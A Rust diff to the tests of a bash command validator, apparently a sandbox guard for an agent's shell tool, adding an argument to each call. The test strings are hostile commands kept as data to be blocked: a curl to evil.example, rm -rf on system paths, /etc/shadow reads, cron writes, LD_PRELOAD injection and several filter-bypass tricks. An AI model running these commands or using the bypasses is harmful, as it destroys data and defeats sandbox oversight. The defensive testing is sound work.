@@ -137,13 +137,13 @@ mod bash_read_only_tests {
 
     #[test]
     fn full_pipeline_allows_safe_command() {
-        let r = validate_command("cargo build", ws(), workspace());
+        let r = validate_command("cargo build", ws(), workspace(), &[]);
         assert_eq!(r, ValidationResult::Allow);
     }
 
     #[test]
     fn full_pipeline_blocks_write_in_read_only() {
-        let r = validate_command("rm file.txt", ro(), workspace());
+        let r = validate_command("rm file.txt", ro(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 }
@@ -341,7 +341,7 @@ mod redirect_validation_tests {
     ) {
         // Use the full pipeline for end-to-end coverage; tests in this module
         // intentionally exercise commands that pass `validate_read_only`.
-        let result = validate_bash_command(command, mode, workspace);
+        let result = validate_bash_command(command, mode, workspace, &[]);
         match (expected, &result) {
             (Expected::Allow, ValidationResult::Allow) => {}
             (Expected::Block, ValidationResult::Block { .. }) => {}
@@ -505,6 +505,7 @@ mod redirect_validation_tests {
             "cat < /etc/shadow",
             PermissionMode::ReadOnly,
             Path::new("/workspace"),
+            &[],
         );
         assert!(matches!(result, ValidationResult::Block { .. }));
     }
@@ -515,6 +516,7 @@ mod redirect_validation_tests {
             "cat < /workspace/notes.txt",
             PermissionMode::ReadOnly,
             Path::new("/workspace"),
+            &[],
         );
         assert_eq!(result, ValidationResult::Allow);
     }
@@ -525,6 +527,7 @@ mod redirect_validation_tests {
             "cat < /etc/shadow",
             PermissionMode::ReadOnly,
             Path::new("/workspace"),
+            &[],
         );
         match result {
             ValidationResult::Block { reason } => {
@@ -873,7 +876,7 @@ mod bash_substitution_and_separator_tests {
 
     #[test]
     fn blocks_dollar_paren_command_substitution_readonly() {
-        let r = validate_bash_command("echo $(rm -rf /etc/passwd)", ro(), workspace());
+        let r = validate_bash_command("echo $(rm -rf /etc/passwd)", ro(), workspace(), &[]);
         assert!(
             matches!(r, ValidationResult::Block { .. }),
             "$(...) must be blocked; got {r:?}"
@@ -886,7 +889,7 @@ mod bash_substitution_and_separator_tests {
         // the redirection target started with `$`, which `validate_paths`
         // silently skipped, allowing the substituted host path to be
         // written at execution time.
-        let r = validate_bash_command("echo data > $(echo /etc/passwd)", ws(), workspace());
+        let r = validate_bash_command("echo data > $(echo /etc/passwd)", ws(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
@@ -895,37 +898,37 @@ mod bash_substitution_and_separator_tests {
         // Quoted, glued form: `>"$(...)"` collapses into a single token
         // because shell_split does not split on `>`. The substitution
         // check still catches the `$(` substring inside the token.
-        let r = validate_bash_command("echo data >\"$(echo /etc/passwd)\"", ws(), workspace());
+        let r = validate_bash_command("echo data >\"$(echo /etc/passwd)\"", ws(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_backtick_command_substitution_readonly() {
-        let r = validate_bash_command("echo `rm -rf /workspace/data`", ro(), workspace());
+        let r = validate_bash_command("echo `rm -rf /workspace/data`", ro(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_process_substitution_read_form_workspace_write() {
-        let r = validate_bash_command("cat <(curl http://evil.example/x)", ws(), workspace());
+        let r = validate_bash_command("cat <(curl http://evil.example/x)", ws(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_process_substitution_write_form_workspace_write() {
-        let r = validate_bash_command("tee >(rm -rf /workspace/x)", ws(), workspace());
+        let r = validate_bash_command("tee >(rm -rf /workspace/x)", ws(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn allows_brace_parameter_expansion_workspace_write() {
-        let r = validate_bash_command("echo ${HOME}", ws(), workspace());
+        let r = validate_bash_command("echo ${HOME}", ws(), workspace(), &[]);
         assert_eq!(r, ValidationResult::Allow);
     }
 
     #[test]
     fn allows_bare_dollar_variable_workspace_write() {
-        let r = validate_bash_command("echo $PATH", ws(), workspace());
+        let r = validate_bash_command("echo $PATH", ws(), workspace(), &[]);
         assert_eq!(r, ValidationResult::Allow);
     }
 
@@ -939,7 +942,7 @@ mod bash_substitution_and_separator_tests {
 
     #[test]
     fn allows_dollar_paren_inside_single_quotes() {
-        let r = validate_bash_command("echo 'literal $(date) text'", ws(), workspace());
+        let r = validate_bash_command("echo 'literal $(date) text'", ws(), workspace(), &[]);
         assert_eq!(
             r,
             ValidationResult::Allow,
@@ -949,7 +952,7 @@ mod bash_substitution_and_separator_tests {
 
     #[test]
     fn allows_backtick_inside_single_quotes() {
-        let r = validate_bash_command("echo 'literal `date` text'", ws(), workspace());
+        let r = validate_bash_command("echo 'literal `date` text'", ws(), workspace(), &[]);
         assert_eq!(
             r,
             ValidationResult::Allow,
@@ -959,7 +962,7 @@ mod bash_substitution_and_separator_tests {
 
     #[test]
     fn allows_escaped_dollar_paren_outside_quotes() {
-        let r = validate_bash_command("echo \\$(date)", ws(), workspace());
+        let r = validate_bash_command("echo \\$(date)", ws(), workspace(), &[]);
         assert_eq!(
             r,
             ValidationResult::Allow,
@@ -970,7 +973,7 @@ mod bash_substitution_and_separator_tests {
     #[test]
     fn allows_backtick_inside_quoted_delimiter_heredoc() {
         let cmd = "cat <<'EOF'\ntext with `backticks` and $(literals)\nEOF";
-        let r = validate_bash_command(cmd, ws(), workspace());
+        let r = validate_bash_command(cmd, ws(), workspace(), &[]);
         assert_eq!(
             r,
             ValidationResult::Allow,
@@ -981,7 +984,7 @@ mod bash_substitution_and_separator_tests {
     #[test]
     fn allows_backtick_inside_double_quoted_delimiter_heredoc() {
         let cmd = "cat <<\"EOF\"\nbody with `backticks`\nEOF";
-        let r = validate_bash_command(cmd, ws(), workspace());
+        let r = validate_bash_command(cmd, ws(), workspace(), &[]);
         assert_eq!(
             r,
             ValidationResult::Allow,
@@ -992,7 +995,7 @@ mod bash_substitution_and_separator_tests {
     #[test]
     fn allows_dash_quoted_heredoc_body() {
         let cmd = "cat <<-'END'\n\tbody $(no_run) and `no_run`\n\tEND";
-        let r = validate_bash_command(cmd, ws(), workspace());
+        let r = validate_bash_command(cmd, ws(), workspace(), &[]);
         assert_eq!(
             r,
             ValidationResult::Allow,
@@ -1005,7 +1008,7 @@ mod bash_substitution_and_separator_tests {
 
     #[test]
     fn blocks_dollar_paren_inside_double_quotes() {
-        let r = validate_bash_command("echo \"output: $(date)\"", ws(), workspace());
+        let r = validate_bash_command("echo \"output: $(date)\"", ws(), workspace(), &[]);
         assert!(
             matches!(r, ValidationResult::Block { .. }),
             "double quotes do NOT disable substitution; got {r:?}"
@@ -1014,7 +1017,7 @@ mod bash_substitution_and_separator_tests {
 
     #[test]
     fn blocks_backtick_inside_double_quotes() {
-        let r = validate_bash_command("echo \"output: `date`\"", ws(), workspace());
+        let r = validate_bash_command("echo \"output: `date`\"", ws(), workspace(), &[]);
         assert!(
             matches!(r, ValidationResult::Block { .. }),
             "double quotes do NOT disable backticks; got {r:?}"
@@ -1024,7 +1027,7 @@ mod bash_substitution_and_separator_tests {
     #[test]
     fn blocks_substitution_inside_unquoted_heredoc() {
         let cmd = "cat <<EOF\n$(rm -rf /etc/passwd)\nEOF";
-        let r = validate_bash_command(cmd, ws(), workspace());
+        let r = validate_bash_command(cmd, ws(), workspace(), &[]);
         assert!(
             matches!(r, ValidationResult::Block { .. }),
             "<<EOF body is expanded; got {r:?}"
@@ -1037,7 +1040,7 @@ mod bash_substitution_and_separator_tests {
         // subsequent commands. After `EOF` closes, a `;` `$(...)` is back
         // in normal context and must block.
         let cmd = "cat <<'EOF'\nliteral `body`\nEOF\n$(rm -rf /etc/passwd)";
-        let r = validate_bash_command(cmd, ws(), workspace());
+        let r = validate_bash_command(cmd, ws(), workspace(), &[]);
         assert!(
             matches!(r, ValidationResult::Block { .. }),
             "post-heredoc substitution must still block; got {r:?}"
@@ -1055,7 +1058,7 @@ mod bash_substitution_and_separator_tests {
 
     #[test]
     fn blocks_eval_with_single_quoted_substitution_workspace_write() {
-        let r = validate_bash_command("eval '$(whoami)'", ws(), workspace());
+        let r = validate_bash_command("eval '$(whoami)'", ws(), workspace(), &[]);
         assert!(
             matches!(r, ValidationResult::Block { .. }),
             "eval with laundered substitution must block; got {r:?}"
@@ -1066,7 +1069,7 @@ mod bash_substitution_and_separator_tests {
     fn blocks_eval_with_literal_string_workspace_write() {
         // Even with no substitution syntax visible, `eval "literal"` is
         // opaque code execution and must be blocked.
-        let r = validate_bash_command("eval \"echo hello\"", ws(), workspace());
+        let r = validate_bash_command("eval \"echo hello\"", ws(), workspace(), &[]);
         assert!(
             matches!(r, ValidationResult::Block { .. }),
             "eval is opaque code execution; got {r:?}"
@@ -1075,13 +1078,13 @@ mod bash_substitution_and_separator_tests {
 
     #[test]
     fn blocks_eval_in_readonly_mode() {
-        let r = validate_bash_command("eval 'whoami'", ro(), workspace());
+        let r = validate_bash_command("eval 'whoami'", ro(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_source_builtin_workspace_write() {
-        let r = validate_bash_command("source /tmp/payload.sh", ws(), workspace());
+        let r = validate_bash_command("source /tmp/payload.sh", ws(), workspace(), &[]);
         assert!(
             matches!(r, ValidationResult::Block { .. }),
             "source executes the file as shell code; got {r:?}"
@@ -1091,7 +1094,7 @@ mod bash_substitution_and_separator_tests {
     #[test]
     fn blocks_dot_builtin_workspace_write() {
         // POSIX `.` is the portable name for `source`.
-        let r = validate_bash_command(". /tmp/payload.sh", ws(), workspace());
+        let r = validate_bash_command(". /tmp/payload.sh", ws(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
@@ -1099,7 +1102,7 @@ mod bash_substitution_and_separator_tests {
     fn blocks_eval_after_pipe() {
         // Code-laundering check must inspect every segment, not just the
         // first command. `cat file | eval` is also opaque execution.
-        let r = validate_bash_command("echo whoami | eval", ws(), workspace());
+        let r = validate_bash_command("echo whoami | eval", ws(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
@@ -1107,13 +1110,13 @@ mod bash_substitution_and_separator_tests {
     fn allows_evaluate_substring_in_other_commands() {
         // Word-boundary check: `evaluate`, `evaluation`, `eval-something`
         // are unrelated identifiers and must not match.
-        let r = validate_bash_command("echo evaluate this", ws(), workspace());
+        let r = validate_bash_command("echo evaluate this", ws(), workspace(), &[]);
         assert_eq!(r, ValidationResult::Allow);
     }
 
     #[test]
     fn allows_filename_containing_eval() {
-        let r = validate_bash_command("cat /workspace/evaluator.log", ro(), workspace());
+        let r = validate_bash_command("cat /workspace/evaluator.log", ro(), workspace(), &[]);
         assert_eq!(r, ValidationResult::Allow);
     }
 
@@ -1124,7 +1127,12 @@ mod bash_substitution_and_separator_tests {
         // Audit 2026-05-14: `echo ok\nrm -rf /workspace/important` was
         // tokenized as a single segment whose first word was `echo`, so
         // the trailing destructive command slipped through.
-        let r = validate_bash_command("echo ok\nrm -rf /workspace/important", ro(), workspace());
+        let r = validate_bash_command(
+            "echo ok\nrm -rf /workspace/important",
+            ro(),
+            workspace(),
+            &[],
+        );
         assert!(
             matches!(r, ValidationResult::Block { .. }),
             "newline-separated rm must reach check_command_segment; got {r:?}"
@@ -1133,13 +1141,18 @@ mod bash_substitution_and_separator_tests {
 
     #[test]
     fn blocks_newline_separated_write_redirection_outside_workspace() {
-        let r = validate_bash_command("echo first\necho second > /etc/passwd", ws(), workspace());
+        let r = validate_bash_command(
+            "echo first\necho second > /etc/passwd",
+            ws(),
+            workspace(),
+            &[],
+        );
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn allows_newline_separated_safe_segments_in_readonly() {
-        let r = validate_bash_command("cat file.txt\nls -la", ro(), workspace());
+        let r = validate_bash_command("cat file.txt\nls -la", ro(), workspace(), &[]);
         assert_eq!(r, ValidationResult::Allow);
     }
 
@@ -1148,7 +1161,7 @@ mod bash_substitution_and_separator_tests {
         // Newline inside single quotes is literal data, not a statement
         // boundary; shell_split must keep the whole quoted segment as one
         // token so the validator does not see a spurious second statement.
-        let r = validate_bash_command("echo 'line1\nline2'", ws(), workspace());
+        let r = validate_bash_command("echo 'line1\nline2'", ws(), workspace(), &[]);
         assert_eq!(r, ValidationResult::Allow);
     }
 
@@ -1157,7 +1170,7 @@ mod bash_substitution_and_separator_tests {
         // CRLF line endings must also be honored as separators so that
         // payloads composed on Windows hosts cannot bypass the check by
         // emitting `\r\n` instead of `\n`.
-        let r = validate_bash_command("echo ok\r\nrm -rf /workspace/x", ro(), workspace());
+        let r = validate_bash_command("echo ok\r\nrm -rf /workspace/x", ro(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 }
@@ -1190,32 +1203,32 @@ mod bash_glued_redirection_and_link_tests {
 
     #[test]
     fn blocks_glued_tee_write_redirection_workspace_write() {
-        let r = validate_bash_command("tee>/etc/passwd", ws(), workspace());
+        let r = validate_bash_command("tee>/etc/passwd", ws(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_glued_append_redirection_workspace_write() {
-        let r = validate_bash_command("cat>>/etc/shadow", ws(), workspace());
+        let r = validate_bash_command("cat>>/etc/shadow", ws(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_glued_echo_write_redirection_workspace_write() {
-        let r = validate_bash_command("echo x>/etc/cron.d/poc", ws(), workspace());
+        let r = validate_bash_command("echo x>/etc/cron.d/poc", ws(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_glued_read_redirection_workspace_write() {
-        let r = validate_bash_command("cat</etc/shadow", ws(), workspace());
+        let r = validate_bash_command("cat</etc/shadow", ws(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn allows_glued_write_redirection_to_workspace_relative() {
         // After tokenization, the target is `out.txt` — still in-workspace.
-        let r = validate_bash_command("echo x>out.txt", ws(), workspace());
+        let r = validate_bash_command("echo x>out.txt", ws(), workspace(), &[]);
         assert_eq!(r, ValidationResult::Allow);
     }
 
@@ -1223,7 +1236,7 @@ mod bash_glued_redirection_and_link_tests {
     fn allows_fd_duplication_2_amp_1() {
         // `2>&1` is fd duplication, not a path-bound write; the `&1`
         // suffix is intentionally skipped by `write_targets_for_segment`.
-        let r = validate_bash_command("echo x > out.txt 2>&1", ws(), workspace());
+        let r = validate_bash_command("echo x > out.txt 2>&1", ws(), workspace(), &[]);
         assert_eq!(r, ValidationResult::Allow);
     }
 
@@ -1231,7 +1244,7 @@ mod bash_glued_redirection_and_link_tests {
     fn blocks_fd_redirection_to_host_path() {
         // `2>/etc/passwd` redirects stderr to a host path — must still be
         // caught after glued tokenization.
-        let r = validate_bash_command("echo x 2>/etc/passwd", ws(), workspace());
+        let r = validate_bash_command("echo x 2>/etc/passwd", ws(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
@@ -1243,7 +1256,7 @@ mod bash_glued_redirection_and_link_tests {
         // the destination `workspace_link` is workspace-relative, the source
         // `/etc/passwd` would, once linked, redirect any future write on the
         // link onto the host path.
-        let r = validate_bash_command("ln -s /etc/passwd workspace_link", ws(), workspace());
+        let r = validate_bash_command("ln -s /etc/passwd workspace_link", ws(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
@@ -1251,21 +1264,21 @@ mod bash_glued_redirection_and_link_tests {
     fn blocks_link_hardlink_source_outside_workspace() {
         // Hardlinks share an inode, so a workspace-internal hardlink to
         // `/etc/passwd` exposes the host inode to in-workspace writes.
-        let r = validate_bash_command("link /etc/passwd workspace_link", ws(), workspace());
+        let r = validate_bash_command("link /etc/passwd workspace_link", ws(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_ln_default_hardlink_source_outside_workspace() {
         // `ln` without `-s` defaults to hardlink semantics; same risk.
-        let r = validate_bash_command("ln /etc/passwd workspace_link", ws(), workspace());
+        let r = validate_bash_command("ln /etc/passwd workspace_link", ws(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn allows_ln_both_args_within_workspace() {
         // Source and destination both workspace-relative — legitimate use.
-        let r = validate_bash_command("ln -s file_a file_b", ws(), workspace());
+        let r = validate_bash_command("ln -s file_a file_b", ws(), workspace(), &[]);
         assert_eq!(r, ValidationResult::Allow);
     }
 
@@ -1274,7 +1287,7 @@ mod bash_glued_redirection_and_link_tests {
         // `cp` reads from source and writes to destination; the inode is
         // not aliased, so an outside-workspace source remains safe to read
         // into the workspace. Only `ln`/`link` get the expanded rule.
-        let r = validate_bash_command("cp /etc/passwd workspace_copy", ws(), workspace());
+        let r = validate_bash_command("cp /etc/passwd workspace_copy", ws(), workspace(), &[]);
         assert_eq!(r, ValidationResult::Allow);
     }
 }
@@ -1315,19 +1328,25 @@ mod bash_interpreter_and_env_injection_tests {
             "python3 -c \"import os; os.system('rm -rf /workspace')\"",
             ro(),
             workspace(),
+            &[],
         );
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_python_dash_c_in_readonly() {
-        let r = validate_bash_command("python -c 'print(1)'", ro(), workspace());
+        let r = validate_bash_command("python -c 'print(1)'", ro(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_perl_dash_e_in_readonly() {
-        let r = validate_bash_command("perl -e 'system(\"rm -rf /workspace\")'", ro(), workspace());
+        let r = validate_bash_command(
+            "perl -e 'system(\"rm -rf /workspace\")'",
+            ro(),
+            workspace(),
+            &[],
+        );
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
@@ -1337,38 +1356,39 @@ mod bash_interpreter_and_env_injection_tests {
             "node -e \"require('child_process').execSync('rm -rf /workspace')\"",
             ro(),
             workspace(),
+            &[],
         );
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_ruby_dash_e_in_readonly() {
-        let r = validate_bash_command("ruby -e 'system(\"id\")'", ro(), workspace());
+        let r = validate_bash_command("ruby -e 'system(\"id\")'", ro(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_bash_dash_c_in_readonly() {
-        let r = validate_bash_command("bash -c 'echo hi'", ro(), workspace());
+        let r = validate_bash_command("bash -c 'echo hi'", ro(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_sh_dash_c_in_readonly() {
-        let r = validate_bash_command("sh -c 'echo hi'", ro(), workspace());
+        let r = validate_bash_command("sh -c 'echo hi'", ro(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_awk_program_via_dash_e_in_readonly() {
         // `awk -e 'BEGIN{system("...")}` is the awk equivalent.
-        let r = validate_bash_command("awk -e 'BEGIN{system(\"id\")}'", ro(), workspace());
+        let r = validate_bash_command("awk -e 'BEGIN{system(\"id\")}'", ro(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_php_dash_r_in_readonly() {
-        let r = validate_bash_command("php -r 'echo 1;'", ro(), workspace());
+        let r = validate_bash_command("php -r 'echo 1;'", ro(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
@@ -1376,7 +1396,7 @@ mod bash_interpreter_and_env_injection_tests {
     fn blocks_sudo_bash_dash_c_in_readonly() {
         // sudo recursion should re-enter check_command_segment, so the
         // wrapped interpreter is also caught.
-        let r = validate_bash_command("sudo bash -c 'echo hi'", ro(), workspace());
+        let r = validate_bash_command("sudo bash -c 'echo hi'", ro(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
@@ -1385,13 +1405,13 @@ mod bash_interpreter_and_env_injection_tests {
         // No `-c` / `-e` / `-r`: running a script file is treated as a
         // process invocation, not arbitrary inline code. The wedge does
         // not introspect script contents.
-        let r = validate_bash_command("python3 script.py", ro(), workspace());
+        let r = validate_bash_command("python3 script.py", ro(), workspace(), &[]);
         assert_eq!(r, ValidationResult::Allow);
     }
 
     #[test]
     fn allows_interpreter_version_query_in_readonly() {
-        let r = validate_bash_command("python3 --version", ro(), workspace());
+        let r = validate_bash_command("python3 --version", ro(), workspace(), &[]);
         assert_eq!(r, ValidationResult::Allow);
     }
 
@@ -1399,7 +1419,7 @@ mod bash_interpreter_and_env_injection_tests {
 
     #[test]
     fn blocks_unquoted_ld_preload_in_readonly() {
-        let r = validate_bash_command("LD_PRELOAD=/tmp/e.so cat /tmp/f", ro(), workspace());
+        let r = validate_bash_command("LD_PRELOAD=/tmp/e.so cat /tmp/f", ro(), workspace(), &[]);
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
@@ -1409,7 +1429,12 @@ mod bash_interpreter_and_env_injection_tests {
         // concatenates `L` + `D_PRELOAD=...` after expansion, so shell_split
         // returns a single token `LD_PRELOAD=/tmp/e.so` even though the
         // raw command does not contain the literal substring.
-        let r = validate_bash_command("env L'D'_PRELOAD=/tmp/e.so cat /tmp/f", ro(), workspace());
+        let r = validate_bash_command(
+            "env L'D'_PRELOAD=/tmp/e.so cat /tmp/f",
+            ro(),
+            workspace(),
+            &[],
+        );
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
@@ -1419,13 +1444,19 @@ mod bash_interpreter_and_env_injection_tests {
             "DYLD_INSERT_LIBRARIES=/tmp/e.dylib cat /tmp/f",
             ro(),
             workspace(),
+            &[],
         );
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
     #[test]
     fn blocks_pythonpath_injection_in_readonly() {
-        let r = validate_bash_command("PYTHONPATH=/tmp/evil python3 -m mymod", ro(), workspace());
+        let r = validate_bash_command(
+            "PYTHONPATH=/tmp/evil python3 -m mymod",
+            ro(),
+            workspace(),
+            &[],
+        );
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
 
@@ -1435,6 +1466,7 @@ mod bash_interpreter_and_env_injection_tests {
             "NODE_OPTIONS='--require /tmp/evil.js' node app.js",
             ro(),
             workspace(),
+            &[],
         );
         assert!(matches!(r, ValidationResult::Block { .. }));
     }
@@ -1444,7 +1476,7 @@ mod bash_interpreter_and_env_injection_tests {
         // False-positive that the old raw-substring check produced:
         // a filename happening to contain the string `LD_PRELOAD` was
         // wrongly blocked. The token-prefix scan no longer trips on it.
-        let r = validate_bash_command("cat /workspace/log_LD_PRELOAD.txt", ro(), workspace());
+        let r = validate_bash_command("cat /workspace/log_LD_PRELOAD.txt", ro(), workspace(), &[]);
         assert_eq!(r, ValidationResult::Allow);
     }
 }
